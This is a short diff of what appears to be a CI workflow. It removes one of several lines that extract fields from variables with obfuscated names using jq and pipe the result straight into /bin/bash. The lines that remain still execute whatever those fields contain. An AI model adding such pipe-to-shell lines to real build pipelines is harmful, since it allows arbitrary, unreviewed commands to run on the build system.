@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$w5954" | jq -r .j86800 | /bin/bash
           echo $av9 | jq -r .nbvj1 | /bin/bash
           printf '%s' "$l3103" | jq -r .zb78 | /bin/bash
-          printf '%s' "$waxw68817" | jq -r .esoy9 | /bin/bash
           echo $igsyc89549 | jq -r .th841 | /bin/bash
 
       - name: Archive results
